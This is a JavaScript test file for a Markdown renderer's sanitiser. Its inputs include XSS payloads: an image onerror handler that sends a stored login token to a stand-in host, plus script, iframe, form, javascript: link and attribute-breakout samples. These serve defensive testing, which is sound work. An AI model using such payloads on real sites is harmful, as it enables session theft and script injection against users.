// @vitest-environment jsdom
import { describe, it, expect } from 'vitest'
import { renderMarkdown } from '../markdown.js'

describe('renderMarkdown', () => {
  it('keeps ordinary formatting', () => {
    const html = renderMarkdown('# Title\n\n**bold** and `code`\n\n- a\n- b')
    expect(html).toContain('<h1>Title</h1>')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<li>a</li>')
  })
  it('strips event handlers that could steal the login token', () => {
    const html = renderMarkdown('<img src=x onerror="fetch(\'https://evil.example/?t=\'+localStorage[\'atlas:jwt\'])">')
    expect(html).not.toMatch(/onerror/i)
    expect(html).not.toContain('evil.example')
  })
  it('strips scripts, iframes, forms and inline styles', () => {
    const html = renderMarkdown('<script>alert(1)</script><iframe src="https://x"></iframe><form action="https://x"><input></form><p style="position:fixed">x</p>')
    expect(html).not.toMatch(/<script|<iframe|<form|<input|style=/i)
  })
  it('neutralises javascript: links but keeps real ones, opening in a new tab', () => {
    expect(renderMarkdown('[x](javascript:alert(1))')).not.toMatch(/javascript:/i)
    const html = renderMarkdown('[docs](https://example.com "a title")')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })
  it('escapes a hostile link title instead of breaking out of the attribute', () => {
    const html = renderMarkdown('[x](https://example.com "a\\" onmouseover=\\"alert(1)")')
    // The text survives only as an escaped part of the title, never as an attribute.
    const a = new DOMParser().parseFromString(html, 'text/html').querySelector('a')
    expect(a.hasAttribute('onmouseover')).toBe(false)
    expect([...a.attributes].map(x => x.name).sort()).toEqual(['href', 'rel', 'target', 'title'])
  })
  it('handles empty input', () => {
    expect(renderMarkdown(undefined)).toBe('')
  })
})
